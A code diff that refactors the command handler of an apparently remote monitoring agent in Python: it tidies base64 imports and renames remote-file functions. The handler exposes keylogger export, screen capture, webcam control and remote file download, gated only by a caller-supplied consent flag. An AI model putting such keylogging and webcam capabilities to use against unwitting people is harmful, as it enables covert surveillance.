@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import base64
 from pathlib import Path
 from typing import Any
 
@@ -13,7 +14,7 @@ from apps.agent.key_capture import (
 )
 from apps.agent.power_provider import run_power_action
 from apps.agent.providers import AgentProviders, build_providers
-from apps.agent.remote_files import discover_allowed_remote_folders, download_allowed_file, list_files_in_allowed_folder
+from apps.agent.remote_files import discover_allowed_remote_folders, download_file_from_allowed_root, list_files_in_allowed_root
 from apps.agent import webcam as webcam_module
 
 PROTECTED_PROCESS_NAMES = {"lsass.exe", "winlogon.exe", "csrss.exe", "services.exe", "system", "registry"}
@@ -53,7 +54,7 @@ async def handle_command(machine_id: str, command: dict[str, Any], sandbox_root:
         return {"events": get_key_capture_events(str(command["session_id"]))}
     if action == "keylogger_export":
         data = export_key_capture_events(str(command["session_id"]), {"approved": bool(command.get("consent"))})
-        return {"filename": f"keylogger-{command['session_id']}.csv", "content_base64": __import__("base64").b64encode(data).decode()}
+        return {"filename": f"keylogger-{command['session_id']}.csv", "content_base64": base64.b64encode(data).decode()}
     if action == "consent_request":
         return display_consent_prompt(dict(command["request"]))
     if action == "capture_screen":
@@ -83,12 +84,13 @@ async def handle_command(machine_id: str, command: dict[str, Any], sandbox_root:
     if action == "remote_files_list":
         if not command.get("consent"):
             raise PermissionError("file_list_consent_required")
-        return {"files": list_files_in_allowed_folder(str(command["root_path"]), str(command.get("relative_path") or ""))}
+        return {"files": list_files_in_allowed_root(str(command["root_path"]), str(command.get("relative_path") or ""))}
     if action == "remote_file_download":
         if not command.get("consent"):
             raise PermissionError("file_download_consent_required")
-        filename, data = download_allowed_file(str(command["root_path"]), str(command["relative_path"]))
-        return {"filename": filename, "content_base64": __import__("base64").b64encode(data).decode()}
+        relative_path = str(command["relative_path"])
+        data = download_file_from_allowed_root(str(command["root_path"]), relative_path)
+        return {"filename": Path(relative_path).name, "content_base64": base64.b64encode(data).decode()}
     if action == "webcam":
         start = bool(command.get("start"))
         result = providers.webcam.set_webcam(start, bool(command.get("consent")), command.get("device_id"))
